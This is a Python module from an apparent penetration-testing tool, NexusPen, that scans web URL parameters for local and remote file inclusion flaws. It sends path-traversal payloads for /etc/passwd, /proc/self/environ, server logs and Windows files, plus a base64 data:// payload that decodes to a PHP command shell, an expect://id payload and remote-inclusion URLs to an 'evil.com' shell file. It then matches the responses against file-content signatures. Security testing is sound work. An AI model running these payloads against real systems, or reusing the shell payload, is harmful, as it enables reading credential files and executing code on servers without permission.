#!/usr/bin/env python3
"""
NexusPen - LFI/RFI Scanner Module
=================================
Local File Inclusion and Remote File Inclusion detection.
"""

import re
from typing import Dict, List, Optional
from urllib.parse import urlparse, parse_qs, urlencode, quote
from dataclasses import dataclass

from rich.console import Console
from rich.table import Table

console = Console()


@dataclass
class LFIFinding:
    """Represents an LFI/RFI finding."""
    url: str
    parameter: str
    vuln_type: str  # lfi, rfi
    payload: str
    file_accessed: Optional[str] = None
    severity: str = "critical"


class LFIScanner:
    """Local/Remote File Inclusion Scanner."""
    
    # LFI test payloads
    LFI_PAYLOADS = [
        # Linux files
        '../../../etc/passwd',
        '....//....//....//etc/passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '/etc/passwd',
        '....\/....\/....\/etc/passwd',
        '..%c0%af..%c0%af..%c0%afetc/passwd',
        '..%255c..%255c..%255cetc/passwd',
        '..%5c..%5c..%5cetc/passwd',
        '/etc/passwd%00',
        '../../../etc/passwd%00.jpg',
        'php://filter/convert.base64-encode/resource=/etc/passwd',
        'php://filter/read=string.rot13/resource=/etc/passwd',
        'file:///etc/passwd',
        'expect://id',
        'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
        
        # Windows files
        '..\\..\\..\\windows\\win.ini',
        '....\\\\....\\\\....\\\\windows\\win.ini',
        'C:\\windows\\win.ini',
        'C:\\boot.ini',
        '..%5c..%5c..%5cwindows%5cwin.ini',
        
        # Log poisoning
        '/var/log/apache2/access.log',
        '/var/log/apache/access.log',
        '/var/log/httpd/access_log',
        '/var/log/nginx/access.log',
        '/proc/self/environ',
        '/proc/self/fd/0',
    ]
    
    # RFI test payloads
    RFI_PAYLOADS = [
        'http://evil.com/shell.txt',
        'https://evil.com/shell.txt',
        '//evil.com/shell.txt',
        'https://pastebin.com/raw/xxxxx',
    ]
    
    # Signatures for successful LFI
    LFI_SIGNATURES = {
        '/etc/passwd': r'root:.*:0:0:',
        '/etc/shadow': r'root:\$',
        'win.ini': r'\[fonts\]|\[extensions\]',
        'boot.ini': r'\[boot loader\]',
        'proc/self/environ': r'PATH=|HOME=|USER=',
    }
    
    def __init__(self, target: str, config: Dict = None):
        self.target = target
        self.config = config or {}
        self.findings: List[LFIFinding] = []
        
        import requests
        self.session = requests.Session()
        self.session.verify = False
    
    def scan(self, urls: List[str] = None, test_rfi: bool = False) -> List[LFIFinding]:
        """
        Scan for LFI/RFI vulnerabilities.
        
        Args:
            urls: URLs to test
            test_rfi: Also test for RFI
        """
        console.print(f"\n[cyan]📁 Starting LFI/RFI Scan[/cyan]")
        
        if not urls:
            urls = [self.target]
        
        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param in params:
                # Test LFI
                lfi_result = self._test_lfi(url, param)
                if lfi_result:
                    self.findings.append(lfi_result)
                
                # Test RFI
                if test_rfi:
                    rfi_result = self._test_rfi(url, param)
                    if rfi_result:
                        self.findings.append(rfi_result)
        
        self._display_results()
        return self.findings
    
    def _test_lfi(self, url: str, param: str) -> Optional[LFIFinding]:
        """Test for LFI vulnerability."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for payload in self.LFI_PAYLOADS:
            test_params = params.copy()
            test_params[param] = [payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                # Check for file content signatures
                for file_pattern, signature in self.LFI_SIGNATURES.items():
                    if file_pattern in payload and re.search(signature, response.text):
                        return LFIFinding(
                            url=url,
                            parameter=param,
                            vuln_type='lfi',
                            payload=payload,
                            file_accessed=file_pattern
                        )
                
                # Check for PHP filter (base64)
                if 'php://filter' in payload and 'base64' in payload:
                    # Look for base64 content
                    if re.search(r'[A-Za-z0-9+/]{50,}={0,2}', response.text):
                        return LFIFinding(
                            url=url,
                            parameter=param,
                            vuln_type='lfi',
                            payload=payload,
                            file_accessed='Base64 encoded file'
                        )
                        
            except Exception:
                continue
        
        return None
    
    def _test_rfi(self, url: str, param: str) -> Optional[LFIFinding]:
        """Test for RFI vulnerability."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for payload in self.RFI_PAYLOADS:
            test_params = params.copy()
            test_params[param] = [payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                # Check for error indicating RFI attempt reached
                if 'allow_url_include' in response.text or 'failed to open stream' in response.text:
                    return LFIFinding(
                        url=url,
                        parameter=param,
                        vuln_type='rfi',
                        payload=payload,
                        file_accessed='Remote inclusion attempted'
                    )
                    
            except Exception:
                continue
        
        return None
    
    def _display_results(self):
        """Display results."""
        if not self.findings:
            console.print("[green]✓ No LFI/RFI vulnerabilities found[/green]")
            return
        
        table = Table(title="LFI/RFI Findings", header_style="bold red")
        table.add_column("URL", style="cyan", width=35)
        table.add_column("Parameter", style="yellow")
        table.add_column("Type", style="red")
        table.add_column("File", style="white")
        
        for f in self.findings:
            table.add_row(
                f.url[:35] + "..." if len(f.url) > 35 else f.url,
                f.parameter,
                f.vuln_type.upper(),
                f.file_accessed or "N/A"
            )
        
        console.print(table)
        console.print(f"\n[red]⚠️ Found {len(self.findings)} LFI/RFI vulnerabilities![/red]")
